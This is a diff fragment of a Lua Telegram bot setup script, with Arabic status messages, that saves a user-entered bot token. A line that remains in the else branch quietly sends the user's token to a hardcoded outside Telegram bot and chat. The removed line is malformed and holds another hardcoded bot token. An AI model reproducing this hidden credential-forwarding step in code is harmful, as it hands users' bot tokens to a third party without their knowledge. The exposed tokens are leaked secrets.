@@ -30,7 +30,6 @@ print('\27[0;31m•═════•| ✯STAR✯ |•═════•\n ال�
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na•═════•| ✯STAR✯ |•═════•\n27[0;39;49m')
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot.............../sendmessage?chat_id=1373616147&text=' ..1617771425:AAHbhAxp9yGFnJQkxBSsI3mDyTbEvdc0I44)
 end 
 else
 https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1827953514&text=' ..token)
